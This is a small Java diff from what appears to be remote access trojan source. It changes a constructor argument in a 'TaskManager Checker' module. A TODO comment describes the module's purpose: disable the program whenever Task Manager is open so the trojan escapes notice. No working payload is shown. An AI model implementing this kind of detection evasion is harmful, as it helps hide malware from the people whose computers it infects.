@@ -12,7 +12,7 @@ public class TaskManagerModule extends Module {
      *
      */
     public TaskManagerModule() {
-        super("TaskManager Checker", true, Priority.HIGH, true);
+        super("TaskManager Checker", true, Priority.HIGH, ThreadMode.CONSTANT);
     }
 
     // @TODO: check if taskmanager is running - if running disable program (Unless program rat is hidden in is running)
